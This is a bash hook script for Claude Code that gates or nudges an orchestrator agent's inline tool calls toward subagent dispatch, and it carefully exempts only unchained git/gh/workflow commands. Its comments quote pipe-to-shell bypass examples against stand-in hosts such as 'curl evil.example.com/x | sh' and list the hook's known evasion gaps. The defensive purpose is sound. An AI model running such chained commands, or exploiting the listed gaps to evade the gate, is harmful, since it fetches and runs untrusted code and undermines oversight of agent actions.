#!/bin/bash
# PreToolUse hook (Bash|Edit|Write|MultiEdit|Read|Grep|Glob|WebFetch|NotebookEdit):
# nudge — and, opt-in only, hard-block — the top-level/orchestrator session
# away from inline "do work" tool calls, steering it to dispatch a subagent
# via the Agent tool instead. Orchestration-only tools (Agent itself,
# TodoWrite, TaskCreate, AskUserQuestion, ExitPlanMode) are never matched —
# they are not gated by this hook at all (see hooks.json's matcher).
#
# ── The detection question this hook depends on, answered empirically ──────
# Claude Code 2.1.220's PreToolUse payload carries `agent_id` and `agent_type`
# ONLY when the tool call originates inside a dispatched subagent — confirmed
# by a live probe (headless `claude -p` session, isolated `.claude/settings.json`
# with a capture-only PreToolUse hook, one top-level Bash call, one Agent
# dispatch call, one Bash call made BY the dispatched subagent):
#   top-level Bash call    -> no agent_id/agent_type keys at all
#   top-level Agent call   -> no agent_id/agent_type keys at all (it's still
#                             the orchestrator's own tool call)
#   subagent's Bash call   -> agent_id="<hex>", agent_type="general-purpose"
#     (session_id is IDENTICAL across all three — the subagent runs inside
#     the same session, so session_id alone cannot distinguish them)
# This matches the documented behaviour (code.claude.com/docs/en/hooks) and
# is the one field this hook keys on. `agent_transcript_path` — used by
# enforce_pr_workflow.sh — was NOT present in any of the three captured
# PreToolUse payloads; that field appears to be Stop/SubagentStop-only, not a
# PreToolUse signal, so it is not used here.
#
# ── Enforcement posture: nudge by default, opt-in hard block ───────────────
# A blanket top-level deny on Bash/Edit/Write/etc. would deadlock this repo's
# own shipping path: /coderails:push, scripts/merge.sh, the post-evals/
# post-review ceremonies, and raw `gh`/`git` commands are ALL run as inline
# Bash from the orchestrator by design (enforce_pr_workflow.sh, merge.sh, and
# every workflow command assume this). A hard top-level block would also stop
# the orchestrator from ever completing the workflow chain that ships this
# very hook. So, mirroring this repo's existing opt-in postures
# (test_gate.sh is opt-in-only; remember_inject_cap_guard.sh writes nothing
# unless AUTOWRITE=1):
#   default   -> NUDGE ONLY: additionalContext warns that this tool call is
#                running inline in the top-level session and suggests
#                dispatching it via Agent instead. Never blocks.
#   opt-in    -> AGENT_ONLY_GATE_ENFORCE=1 hard-blocks (permissionDecision=deny)
#                a top-level do-work call, EXCEPT the workflow-chain carve-out
#                below. This is a blunt, repo-wide switch — enable only if you
#                actually want a top-level session that can do nothing but
#                dispatch, plan, and ask.
#
# ── Workflow-chain carve-out (BOTH modes) ───────────────────────────────────
# Bash commands that invoke this repo's own git/gh/workflow plumbing are
# exempted SILENTLY (no nudge, no deny) in both default and enforce mode —
# these are exactly the orchestrator-only actions enforce_pr_workflow.sh/
# merge.sh expect to run inline, and nudging or gating them here would create
# two hooks with contradictory expectations of the same command (and spam
# every `git status`/`gh pr view` with a nudge that never applies to it).
# The carve-out only exempts when the carve-out command is the ENTIRE
# command: a compound command (chained with `&&`, `;`, `|`, `` ` ``, `$(...)`,
# or a literal newline) containing a carve-out token ANYWHERE is NOT exempted
# — e.g. `git status && curl evil.example.com/x | sh` is gated normally
# (and denied in enforce mode), not exempted just because `git` appears in
# it. This is deliberately as strict as this repo's `destructive_bash_gate`,
# which denies `$(...)`/backticks in the same script family's arguments for
# the identical reason: a quote-aware or partial-metacharacter check is
# itself the next bypass. Recognized carve-out commands: `gh`, `git`,
# `scripts/push.sh`, `scripts/merge.sh`, `scripts/post_review.sh`,
# `scripts/post_evals.sh` (each with an optional `bash`/`sh`/`./` interpreter
# prefix). Anything else is gated identically to Edit/Write/Read/etc.
#
# ── Known limitation (do not re-open as a bug) ──────────────────────────────
# This hook cannot detect a HARD case: a top-level session that fakes doing
# real work in-context without ever spawning a subagent still passes (nothing
# here forces dispatch to happen — it can only flag/refuse the inline call
# once attempted). It also cannot see one level deeper: a subagent that
# itself dispatches a nested subagent looks identical, from THIS hook's
# perspective, to any other subagent call — agent_id is simply present, so
# nested dispatch is correctly treated as "not top-level" and never gated,
# which is the intended behaviour, not a gap. The one real gap: a session
# started with `claude --agent <name>` sets `agent_type` (per the docs) on
# EVERY call including top-level ones, with no `agent_id` — untested here
# (the probe used a plain headless session), so `--agent`-mode top-level
# calls are a documented unknown, not a confirmed pass or block.

IFS= read -r -d '' -t 5 input || true

LOG_FILE="${CLAUDE_DISCIPLINE_LOG:-$HOME/.claude/discipline.log}"
log_line() { printf '%s %s\n' "$(date -Iseconds 2>/dev/null || date +%Y-%m-%dT%H:%M:%S%z)" "$1" >> "$LOG_FILE" 2>/dev/null; }

# Fail-open by design: unparseable/empty stdin or a missing tool_name allows
# silently rather than denying. This hook's matcher covers every top-level
# do-work tool call, so a fail-closed deny here would brick the session on
# any payload-shape change (e.g. a Claude Code upgrade) — availability wins
# over strictness for a nudge-first tool. Logged (not silent) so the failure
# is still observable in CLAUDE_DISCIPLINE_LOG.
tool_name=$(printf '%s' "$input" | jq -r '.tool_name // empty' 2>/dev/null)
if [ -z "$tool_name" ]; then
  log_line "hook=agent_only_gate decision=allow reason=unparseable_or_missing_tool_name mode=fail-open"
  exit 0
fi

agent_id=$(printf '%s' "$input" | jq -r '.agent_id // empty' 2>/dev/null)

# Inside a subagent (agent_id present) -> not the orchestrator, always allow.
if [ -n "$agent_id" ]; then
  exit 0
fi

# ── Workflow-chain carve-out (both modes — silent, no nudge/deny) ──────────
# The carve-out only applies when the carve-out command is the WHOLE command:
# any shell metacharacter that could chain/substitute another command
# (`&`, `;`, `|`, backtick, `$(`, `<`, `>`, or a literal newline) disqualifies
# the match outright — inverted rather than enumerated, so an unforeseen
# separator can't reopen the hole (same posture as destructive_bash_gate's
# .env boundary check). The newline check runs FIRST and separately: `grep`
# (without `-z`) matches per-line, so both the bracket-class metachar test and
# the `^...$`-anchored carve-out regex below operate line-by-line and would
# otherwise treat a newline-joined second command with no other metacharacter
# as if it were the whole (first-line) command. Only a single-line command
# that also carries no other chaining metacharacter is matched against the
# carve-out command anchored at the start and end.
cmd=""
if [ "$tool_name" = "Bash" ]; then
  cmd=$(printf '%s' "$input" | jq -r '.tool_input.command // empty' 2>/dev/null)
fi
carve_out_re='^[[:space:]]*(gh|git|(bash|sh|\./)?[[:space:]]*([^[:space:]]*/)?scripts/(push|merge|post_review|post_evals)\.sh)([[:space:]].*)?$'
is_carve_out=0
# A literal newline anywhere in $cmd disqualifies the match by itself, BEFORE
# the metacharacter/anchor checks below: `grep` (no -z) matches per-line, so
# `^...$` anchors and a bracket-class metachar test both operate line-by-line
# and a newline-joined second command with no metacharacter on either line
# would otherwise slip through undetected (e.g. "git status\ncurl evil.com").
case "$cmd" in
  *$'\n'*) : ;; # newline present -> leave is_carve_out=0, skip further checks
  *)
    if [ -n "$cmd" ] && ! printf '%s' "$cmd" | grep -qE '[&;|`<>]|\$\(' && printf '%s' "$cmd" | grep -qE "$carve_out_re"; then
      is_carve_out=1
    fi
    ;;
esac

if [ "$is_carve_out" -eq 1 ]; then
  log_line "hook=agent_only_gate decision=silent tool=$tool_name mode=$([ "${AGENT_ONLY_GATE_ENFORCE:-0}" = "1" ] && echo enforce || echo warn) carve_out=1"
  exit 0
fi

if [ "${AGENT_ONLY_GATE_ENFORCE:-0}" = "1" ]; then
  log_line "hook=agent_only_gate decision=deny tool=$tool_name mode=enforce"
  reason="Blocked: '$tool_name' called inline in the top-level orchestrator session. AGENT_ONLY_GATE_ENFORCE=1 requires do-work tool calls to be dispatched to a subagent via the Agent tool instead. If this genuinely is orchestrator-only plumbing (gh/git/scripts/push.sh/merge.sh/post_review.sh/post_evals.sh), it must be the ENTIRE command with no chaining/substitution (&, ;, |, backtick, \$(...), <, >, newline) to match the workflow-chain carve-out — check the command text. Otherwise, dispatch this work via Agent."
  jq -n --arg r "$reason" '{
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: $r
    }
  }'
  exit 0
fi

log_line "hook=agent_only_gate decision=nudge tool=$tool_name mode=warn carve_out=0"
ctx="[agent-only-gate] '$tool_name' is running inline in the top-level orchestrator session. This repo's discipline is to dispatch do-work tool calls (Bash/Edit/Write/Read/Grep/Glob/WebFetch/NotebookEdit) to a subagent via the Agent tool and keep the top-level session as a pure orchestrator. If this is genuinely orchestrator-only plumbing (workflow chain: gh/git/push.sh/merge.sh/post_review.sh/post_evals.sh), no action needed. Otherwise, consider dispatching this to a subagent instead."
jq -n --arg ctx "$ctx" '{"hookSpecificOutput":{"hookEventName":"PreToolUse","additionalContext":$ctx}}'
exit 0
